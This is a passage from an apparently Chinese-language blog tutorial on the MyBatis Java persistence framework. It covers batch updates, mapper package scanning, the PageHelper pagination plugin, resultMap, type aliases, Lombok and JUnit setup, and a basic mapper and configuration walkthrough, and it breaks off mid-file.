<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateBatch&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;java.util.List&quot;</span>&gt;</span></span><br><span class="line">    UPDATE t_emp</span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;empName != null&quot;</span>&gt;</span>emp_name = CASE emp_id</span><br><span class="line">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;list&quot;</span> <span class="attr">item</span>=<span class="string">&quot;emp&quot;</span> <span class="attr">index</span>=<span class="string">&quot;index&quot;</span> <span class="attr">separator</span>=<span class="string">&quot; &quot;</span>&gt;</span></span><br><span class="line">                WHEN #&#123;emp.empId&#125; THEN #&#123;emp.empName&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">            ELSE emp_name END,</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;empSalary != null&quot;</span>&gt;</span>emp_salary = CASE emp_id</span><br><span class="line">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;list&quot;</span> <span class="attr">item</span>=<span class="string">&quot;emp&quot;</span> <span class="attr">index</span>=<span class="string">&quot;index&quot;</span> <span class="attr">separator</span>=<span class="string">&quot; &quot;</span>&gt;</span></span><br><span class="line">                WHEN #&#123;emp.empId&#125; THEN #&#123;emp.empSalary&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">            ELSE emp_salary END</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">    WHERE emp_id IN</span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;list&quot;</span> <span class="attr">item</span>=<span class="string">&quot;emp&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span>&gt;</span></span><br><span class="line">        #&#123;emp.empId&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure>



<hr>
<h1 id="高级扩展"><a href="#高级扩展" class="headerlink" title="高级扩展"></a>高级扩展</h1><h2 id="Mapper批量映射"><a href="#Mapper批量映射" class="headerlink" title="Mapper批量映射"></a>Mapper批量映射</h2><p>MyBatis需要在配置文件中指定mapper映射文件（即编写SQL语句的文件）的具体位置，如果单个指定太麻烦，可以批量指定，批量指定时资源创建要求如下：</p>
<ul>
<li><p><code>Mapper</code> 接口和 <code>Mapper</code> 配置文件名称一致</p>
<blockquote>
<p>Mapper 接口：EmployeeMapper.java</p>
<p>Mapper 配置文件：EmployeeMapper.xml</p>
</blockquote>
</li>
<li><p><code>Mapper</code> 配置文件放在 <code>Mapper</code> 接口所在的包内，最终打包后的位置要一致</p>
<blockquote>
<p>按原来直接放在resources下，最终打包时会在不同的包下。</p>
</blockquote>
<ul>
<li><p>可以将mapperxml文件放在mapper接口所在的包，同时修改maven打包方式，修改pom文件：</p>
  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
<li><p><code>（推荐）</code>可以在resources下创建mapper接口包一致的文件夹结构存放mapperxml文件，如：</p>
<blockquote>
<p> 接口在 src&#x2F;main&#x2F;java**&#x2F;com&#x2F;fu&#x2F;mapper**下，则</p>
<p>映射文件在 &#x2F;src&#x2F;main&#x2F;resources**&#x2F;com&#x2F;fu&#x2F;mapper**下</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<p>配置方法如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.fu.mapper&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：resources下创建多次文件夹需要使用 “&#x2F;“ 分隔而不是 “.” 与java下不同！！</strong>使用’.’是名称而不是分隔了。</p>
<hr>
<h2 id="插件和分页插件PageHelper"><a href="#插件和分页插件PageHelper" class="headerlink" title="插件和分页插件PageHelper"></a>插件和分页插件PageHelper</h2><p>MyBatis 对插件进行了标准化的设计，并提供了一套可扩展的插件机制。<strong>插件可以在用于语句执行过程中进行拦截，并允许通过自定义处理程序来拦截和修改 SQL 语句、映射语句的结果等。</strong><br>具体来说，MyBatis 的插件机制包括以下三个组件：</p>
<ol>
<li><p>interceptor（拦截器）：定义一个拦截方法 intercept，该方法在执行 SQL 语句、执行查询、查询结果的映射时会被调用。</p>
</li>
<li><p>Invocation（调用）：实际上是对被拦截的方法的封装，封装了 Object target、Method method 和 Object[] args 这三个字段。</p>
</li>
<li><p>InterceptorChain（拦截器链）：对所有的拦截器进行管理，包括将所有的 Interceptor 链接成一条链，并在执行 SQL 语句时按顺序调用。</p>
</li>
</ol>
<p>插件的开发非常简单，只需要实现 Interceptor 接口，并使用注解 @Intercepts 来标注需要拦截的对象和方法，然后在 MyBatis 的配置文件中添加插件即可。</p>
<p>PageHelper 是 MyBatis 中比较著名的分页插件，它提供了多种分页方式（例如 MySQL 和 Oracle 分页方式），支持多种数据库，并且使用非常简单。我们编写SQL是<strong>无需再使用<code>limit</code>分页</strong>，只需要事先在插件中设置，同时<strong>编写SQL时不要以<code>;</code>结尾</strong>。</p>
<p>使用步骤：</p>
<p>（1）引入依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.pagehelper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pagehelper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>（2）配置文件配置插件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">&quot;com.github.pagehelper.PageInterceptor&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;helperDialect&quot;</span> <span class="attr">value</span>=<span class="string">&quot;mysql&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--value是语法对应的数据库--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>（3）使用：</p>
<p>正常编写SQL语句，不要使用<code>;</code>结尾，在Java代码中，查询前使用</p>
<p><code>startPage</code>和<code>new PageInfo</code>间只能有一个查询语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PageHelper.startPage(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">// 参数1：第n页 参数2：每页数据项数</span></span><br><span class="line">List&lt;Employee&gt; employees = empMapper.select();</span><br><span class="line"><span class="comment">// 将查询结果封装到一个PageInfo分页实体类中（一共几页，一共几条等）</span></span><br><span class="line">PageInfo&lt;Employee&gt; pageInfo = <span class="keyword">new</span> <span class="title class_">PageInfo</span>&lt;&gt;(employees);</span><br><span class="line"><span class="comment">// 获取当前页等信息</span></span><br><span class="line"><span class="comment">// 当前页</span></span><br><span class="line">List&lt;Employee&gt; list = pageInfo.getList();</span><br><span class="line"><span class="comment">// 总页数</span></span><br><span class="line"><span class="type">int</span> <span class="variable">pages</span> <span class="operator">=</span> pageInfo.getPages();</span><br><span class="line"><span class="comment">// 总条数</span></span><br><span class="line"><span class="type">long</span> <span class="variable">total</span> <span class="operator">=</span> pageInfo.getTotal();</span><br><span class="line"><span class="comment">// ....</span></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="逆向工程和MyBatisX插件"><a href="#逆向工程和MyBatisX插件" class="headerlink" title="逆向工程和MyBatisX插件"></a>逆向工程和MyBatisX插件</h2><h3 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h3><p>ORM（Object-Relational Mapping，对象-关系映射）是一种将数据库和面向对象编程语言中的对象之间进行转换的技术。它将对象和关系数据库的概念进行映射，最后我们就可以通过方法调用进行数据库操作，即让我们可以使用面向对象思维进行数据库操作！！！</p>
<p>ORM 框架通常有半自动和全自动两种方式。</p>
<ul>
<li><p>半自动 ORM 通常需要程序员手动编写 SQL 语句或者配置文件，将实体类和数据表进行映射，还需要手动将查询的结果集转换成实体对象。</p>
</li>
<li><p>全自动 ORM 则是将实体类和数据表进行自动映射，使用 API 进行数据库操作时，ORM 框架会自动执行SQL 语句并将查询结果转换成实体对象，程序员无需再手动编写 SQL 语句和转换代码。</p>
</li>
</ul>
<h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><p>可以自动生成针对单表的增删改查。</p>
<p>（0）在idea中设置-插件-下载MyBatisX，重启IDEA</p>
<p>（1）IDEA中连接数据库</p>
<p>（2）在IDEA数据库页面，右键表，可以设置</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241229211940.png"></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241229212005.png"></p>
<hr>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="别名设置"><a href="#别名设置" class="headerlink" title="别名设置"></a>别名设置</h2><p>在mapper配置文件（非SQL编写文件）下添加标签：<code>typeAliases</code>，两种方式：</p>
<ul>
<li>单个类别名指定，别名为指定的名称。</li>
<li>全软件包下类别名指定，别名为 <strong>类名首字母小写</strong><ul>
<li>在此情况下，如果需要为某个类单独取别名，则在类名前添加注解<code>@Alias(&quot;别名&quot;)</code></li>
</ul>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">type</span>=<span class="string">&quot;类的全限定符&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;别名&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;软件包&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--指定包时，包下所有类的别名为 类名首字母小写--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="自定义映射关系"><a href="#自定义映射关系" class="headerlink" title="自定义映射关系&lt;resultMap"></a>自定义映射关系&lt;resultMap</h2><p>上文指出，当数据库<code>列名和实体类属性名不一致</code>时，我们可以采取<code>SQL语句给列起别名</code>或<code>开启驼峰映射</code>的方式解决。此外，我们还可以采取<code>自定义映射关系</code>的方式，使用<code>resultMap</code>标签。</p>
<p><code>resultType</code>标签：(普通列的映射关系）按照规则自动映射，按照是否开启驼峰式映射，自动映射属性名和列名，且只能映射一层结构。（假如某个实体类A的属性是另一个实体类B，而B有属性a，数据库表中有与A和B属性对应的字段，若开启了数据库表中字段与类A属性的映射，则B内属性不再映射。）</p>
<p><code>resultMap</code>标签：（对象的映射关系）用于定义SQL查询结果与Java对象之间的映射规则，它允许自定义列到属性的映射、处理复杂的数据类型（如嵌套对象和集合）、支持构造函数注入，并可以优化关联对象的加载方式，确保即使在数据库列名与实体类属性名不一致或存在复杂关系的情况下，也能准确地将查询结果转换为Java对象。</p>
<p>SQL编写示例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    标签内 id 属性即名称，对应select等标签的resultMap</span></span><br><span class="line"><span class="comment">		  type属性：实体类的全路径名或别名</span></span><br><span class="line"><span class="comment">    &lt;id子标签：主键映射关系</span></span><br><span class="line"><span class="comment">    &lt;result子标签：普通列映射关系</span></span><br><span class="line"><span class="comment">		  property：实体类属性名</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;eMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;employee&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;emp_id&quot;</span> <span class="attr">property</span>=<span class="string">&quot;empId&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;emp_name&quot;</span> <span class="attr">property</span>=<span class="string">&quot;empName&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;emp_salary&quot;</span> <span class="attr">property</span>=<span class="string">&quot;empSalary&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">		对象型属性赋值：association标签：</span></span><br><span class="line"><span class="comment">			property：对象属性名</span></span><br><span class="line"><span class="comment">			javaType:对象所属类全限定符或别名</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">	接口方法:Employee queryById(Integer id);</span></span><br><span class="line"><span class="comment">	resultMap=&quot;eMap&quot;,使用 eMap 代表的映射 </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryById&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;eMap&quot;</span>&gt;</span></span><br><span class="line">    select * from t_emp where emp_id = #&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="Lombok插件和jupiter的测试功能"><a href="#Lombok插件和jupiter的测试功能" class="headerlink" title="Lombok插件和jupiter的测试功能"></a>Lombok插件和jupiter的测试功能</h2><p>Lombok插件可以通过注解自动生成get、set方法，只需要在实体类上添加注释<code>@Data</code>，并在项目中引入依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><code>@Test</code>的测试方法可以通过两个标签，指示每个测试方法执行前后都需要执行的内容，如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> SqlSession session;</span><br><span class="line"><span class="meta">@BeforeEach</span> <span class="comment">// 每个测试方法执行前都需要执行的</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">    session = <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>()</span><br><span class="line">            .build(</span><br><span class="line">                    Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>))</span><br><span class="line">            .openSession();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@AfterEach</span> <span class="comment">// 每个测试方法执行后都需要执行的</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> &#123;</span><br><span class="line">    session.commit();</span><br><span class="line">    session.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="驼峰自动映射"><a href="#驼峰自动映射" class="headerlink" title="驼峰自动映射"></a>驼峰自动映射</h2><p>将数据库中按蛇形命名法命名的列名自动转为驼峰命名法的名称（去“_”并将其后首字母大写），以对应实体类对象属性名。<strong>设置方法：</strong>在mapper配置文件中，<code>settings</code>标签下添加子标签<code>setting</code>，并设置如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--开启驼峰自动映射--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;mapUnderscoreToCamelCase&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>默认情况下只能进行一层自动映射（即如果有实体类对象作为属性，属性或实体类的映射必须自己指定）。如果需要多层映射，需要开启设置<code>autoMappingBehavior</code>为FULL</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--开启驼峰自动映射--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;autoMappingBehavior&quot;</span> <span class="attr">value</span>=<span class="string">&quot;FULL&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="重要注意事项"><a href="#重要注意事项" class="headerlink" title="重要注意事项"></a>重要注意事项</h2><p><strong>注意：</strong></p>
<ul>
<li>resources下创建多次文件夹需要使用 “&#x2F;“ 分隔而不是 “.” 与java下不同！！</li>
</ul>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>mybatis核心api介绍回顾：</p>
<ul>
<li>SqlSessionFactoryBuilder：这个类可以被实例化、使用和丢弃，一旦创建了 SqlSessionFactory，就不再需要它了。 因此SqlSessionFactoryBuilder 实例的最佳作用域是方法作用域（也就是局部方法变量）。 无需ioc容器管理！</li>
<li>SqlSessionFactory：一旦被创建就应该在应用的运行期间一直存在，没有任何理由丢弃它或重新创建另一个实例。 使用 SqlSessionFactory 的最佳实践是在应用运行期间不要重复创建多次，因此 SqlSessionFactory 的最佳作用域是应用作用域。 需要ioc容器管理！</li>
<li>SqlSession：每个线程都应该有它自己的 SqlSession 实例。SqlSession 的实例不是线程安全的，因此是不能被共享的，所以它的最佳的作用域是请求或方法作用域。 无需ioc容器管理！</li>
<li>Mapper映射器实例：映射器是一些绑定映射语句的接口。映射器接口的实例是从 SqlSession 中获得的。虽然从技术层面上来讲，任何映射器实例的最大作用域与请求它们的 SqlSession 相同。但方法作用域才是映射器实例的最合适的作用域。从作用域的角度来说，映射器实例不应该交给ioc容器管理！但是从使用的角度来说，业务类（service）需要注入mapper接口，所以mapper应该交给ioc容器管理！</li>
</ul>
<p><strong>总结</strong><br>将SqlSessionFactory实例存储到IoC容器<br>将Mapper实例存储到IoC容器 </p>
<p>mybatis整合思路理解： mybatis的api实例化需要复杂的过程。</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="实践1：引入实践"><a href="#实践1：引入实践" class="headerlink" title="实践1：引入实践"></a>实践1：引入实践</h2><p>仅用于了解原理和过程。</p>
<h3 id="步骤0：导入依赖："><a href="#步骤0：导入依赖：" class="headerlink" title="步骤0：导入依赖："></a>步骤0：导入依赖：</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="步骤1：创建mapper接口，用于各种SQL语句方法定义"><a href="#步骤1：创建mapper接口，用于各种SQL语句方法定义" class="headerlink" title="步骤1：创建mapper接口，用于各种SQL语句方法定义"></a>步骤1：创建mapper接口，用于各种SQL语句方法定义</h3><p>Mybatis 中的 Mapper 接口相当于以前的 Dao。但是区别在于，Mapper 仅仅只是建接口即可，<strong>不需要提供实现类</strong>，具体的SQL写到对应的Mapper文件。<strong>此Mapper接口不允许重载！</strong></p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241223002040.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">EmployeeMapper</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">queryById</span><span class="params">(Integer empId)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="步骤2：创建Mapper的XML文件，编写SQL语句"><a href="#步骤2：创建Mapper的XML文件，编写SQL语句" class="headerlink" title="步骤2：创建Mapper的XML文件，编写SQL语句"></a>步骤2：创建Mapper的XML文件，编写SQL语句</h3><p>MyBatis 框架下，SQL语句编写位置发生改变，从原来的Java类，改成XML或者注解定义。推荐在XML文件中编写SQL语句，让用户能更专注于 SQL 代码，不用关注其他的JDBC代码。一般编写SQL语句的文件命名：XxxMapper.xml Xxx。</p>
<p><code>一般取表名</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- namespace等于mapper接口类的全限定名,这样实现对应 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.fu.mapper.EmployeeMapper&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 查询使用 select标签，标签内编写SQL语句</span></span><br><span class="line"><span class="comment">            id = 方法名</span></span><br><span class="line"><span class="comment">            resultType = 返回值类型</span></span><br><span class="line"><span class="comment">     --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.fu.pojo.Employee&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- #&#123;empId&#125;代表动态传入的参数,并且进行赋值!后面详细讲解 --&gt;</span></span><br><span class="line">        select emp_id empId,emp_name empName, emp_salary empSalary from t_emp where emp_id = #&#123;empId&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<ul>
<li>方法名和SQL的id一致</li>
<li>方法返回值和resultType一致</li>
<li>方法的参数和SQL的参数一致</li>
<li>接口的全类名和映射配置文件的名称空间一致</li>
</ul>
<h3 id="步骤3：编写MyBatis配置文件"><a href="#步骤3：编写MyBatis配置文件" class="headerlink" title="步骤3：编写MyBatis配置文件"></a>步骤3：编写MyBatis配置文件</h3><p>mybatis框架配置文件： 数据库连接信息，性能配置，mapper.xml配置等。习惯上命名为 <code>mybatis-config.xml</code>，非强制要求。整合 Spring 之后可以省略。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- environments表示配置Mybatis的开发环境，可以配置多个环境，在众多具体环境</span></span><br><span class="line"><span class="comment">    中，使用default属性指定实际运行时使用的环境。default属性的取值是environment标签的</span></span><br><span class="line"><span class="comment">    id属性的值。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- environment表示配置Mybatis的一个具体的环境 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- Mybatis的内置的事务管理器 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 配置数据源 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 建立数据库连接的具体信息 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;15767&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 